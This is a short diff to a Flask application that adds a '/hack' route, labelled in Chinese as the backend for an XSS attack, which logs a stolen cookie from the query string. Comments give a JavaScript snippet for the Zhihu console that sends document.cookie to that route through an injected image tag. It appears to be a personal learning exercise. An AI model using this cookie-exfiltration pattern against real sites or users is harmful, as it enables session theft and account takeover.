@@ -196,6 +196,17 @@ def uploads(filename):
     return send_from_directory(image_file_dir, filename)
 
 
+# 在知乎console输入
+# var c = document.cookie
+# var img = `<img src='http://localhost:4000/hack?cookie=${c}'>`
+# document.body.innerHTML += img
+@main.route('/hack')
+def hack():
+    # xss 攻击的后台
+    cookie = request.args.get('cookie')
+    print('cookie', cookie)
+
+
 # route_dict = {
 #     '/': route_index,
 #     '/login': route_login,
